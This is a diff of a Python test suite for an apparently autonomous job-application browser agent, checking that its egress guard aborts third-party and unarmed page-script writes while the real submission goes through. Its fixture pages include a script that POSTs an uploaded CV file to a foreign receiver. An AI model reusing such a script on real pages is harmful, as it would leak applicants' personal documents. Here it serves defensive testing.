@@ -472,7 +472,12 @@ async def test_production_autonomous_scripted_submit(scenario, production_pool, 
         job, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
         result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
         assert result.submit_clicked_at and not receiver.sent
-        if scenario in {"json", "url", "text"}:
+        if scenario == "late_foreign":
+            # A third-party beacon after the data was entered is aborted; the first-party send and its receipt stand.
+            assert result.status == "submitted", result.result.dispatch_diagnostics
+            assert result.result.dispatch_diagnostics.receipt_reason == "confirmation_json"
+            assert result.result.dispatch_diagnostics.aborted_hosts == ["127.0.0.1"]
+        elif scenario in {"json", "url", "text"}:
             assert result.status == "submitted", result.result.dispatch_diagnostics
             assert result.result.dispatch_diagnostics.receipt_reason == f"confirmation_{scenario}"
             assert db.get_job(job.id).status == "applied"
@@ -580,7 +585,7 @@ async def test_production_autonomous_submits_with_receipt_and_scoped_decisions(p
     assert b"marketing=" not in server.posts[0]["body"]
     assert result.result.dispatch_diagnostics.model_dump() == {
         "step": 1, "control": "final_submit", "receipt_kind": "first_party_confirmation", "receipt_reason": "confirmation_text",
-        "email": None,
+        "email": None, "aborted_hosts": [], "aborted_requests": 0,
     }
 
 
@@ -802,7 +807,7 @@ async def test_production_autonomous_batch_gates(restriction, production_pool, s
         assert store.host_paused("127.0.0.1") and "supervisé" in runs[2].message
 
 
-async def test_production_autonomous_blocks_foreign_write_after_upload(production_pool, server, profile, tmp_path, fast, monkeypatch):
+async def test_production_autonomous_aborts_foreign_write_after_upload_and_still_sends(production_pool, server, profile, tmp_path, fast, monkeypatch):
     monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
     with closing(FixtureServer()) as receiver:
         server.html["/jobs/100"] = posting_form("/jobs/100") + f"""<script>
@@ -811,20 +816,27 @@ async def test_production_autonomous_blocks_foreign_write_after_upload(productio
             await fetch('{receiver.base}/foreign', {{method: 'POST', body: cv.files[0]}});
         }};
         </script>"""
+        server.post_pages["/jobs/100"] = "confirmation.html"
         _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
         result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
-        assert server.posts_to("/upload") and not receiver.posts and not server.posts_to("/jobs/100")
-        assert store.outstanding_attempt(app.id).id == result.id
+        # The foreign copy of the CV never leaves the browser; the window stays open and the bound send goes through.
+        assert server.posts_to("/upload") and not receiver.posts and len(server.posts_to("/jobs/100")) == 1
+        assert result.status == "submitted", result.message
+        assert result.result.dispatch_diagnostics.aborted_hosts == ["127.0.0.1"]
 
 
-async def test_production_autonomous_refuses_page_script_submit_before_final_click(production_pool, server, profile, tmp_path, fast, monkeypatch):
+async def test_production_autonomous_aborts_page_script_write_before_final_click(production_pool, server, profile, tmp_path, fast, monkeypatch):
     monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
     server.html["/jobs/100"] = posting_form("/jobs/100") + """<script>
         document.querySelector('#name').oninput = () => fetch('/jobs/100', {method: 'POST', body: 'synthetic'});
     </script>"""
+    server.post_pages["/jobs/100"] = "confirmation.html"
     _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
     result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
-    assert result.status == "needs_human" and not server.posts and not result.submit_clicked_at
+    # The script's write after input, outside an armed click, is aborted; only the guarded final click reaches the server.
+    assert result.status == "submitted", result.message
+    assert [post["body"] for post in server.posts] == [b"first_name=Camille&cv=CV.pdf"]
+    assert result.result.dispatch_diagnostics.aborted_requests >= 1
 
 
 async def test_production_autonomous_allows_sibling_upload(production_pool, server, profile, tmp_path, fast, monkeypatch):
@@ -1166,7 +1178,7 @@ async def test_production_supervised_non_http_is_inert_in_pages_frames_and_popup
         finally:
             await opened.close()
             result = await asyncio.wait_for(task, timeout=10)
-        assert not foreign.requests and not foreign.posts
+        assert not foreign.page_requests and not foreign.posts
         assert store.outstanding_attempt(app.id).id == result.id and not production_pool._contexts
     finally:
         foreign.close()
@@ -1202,7 +1214,7 @@ async def test_production_transport_inert_in_fresh_realms(kind, production_pool,
                 await loaded;
                 return [before, inert(frame.contentWindow.WebSocket, target)];
             }""", [kind, target], isolated_context=False)
-            assert all(checks) and not foreign.requests and not foreign.posts
+            assert all(checks) and not foreign.page_requests and not foreign.posts
     finally:
         foreign.close()
 
@@ -1230,7 +1242,7 @@ async def test_production_initial_redirects_are_bounded_and_validated(scenario, 
                 assert await opened.locator("input").count() > 0
             else:
                 assert guard.refused and opened.is_closed() and "/hop-6" not in server.requests
-            assert not foreign.requests
+            assert not foreign.page_requests
     finally:
         foreign.close()
 
@@ -1304,7 +1316,7 @@ async def test_supervised_recipient_refusal_closes_and_holds(egress, page, serve
             await confirm_step(app.id)
         result = await asyncio.wait_for(task, timeout=12)
         assert page.is_closed() and store.outstanding_attempt(app.id).id == result.id
-        assert "fenêtre fermée" in result.message and not foreign.requests and not foreign.posts
+        assert "fenêtre fermée" in result.message and not foreign.page_requests and not foreign.posts
     finally:
         foreign.close()
 
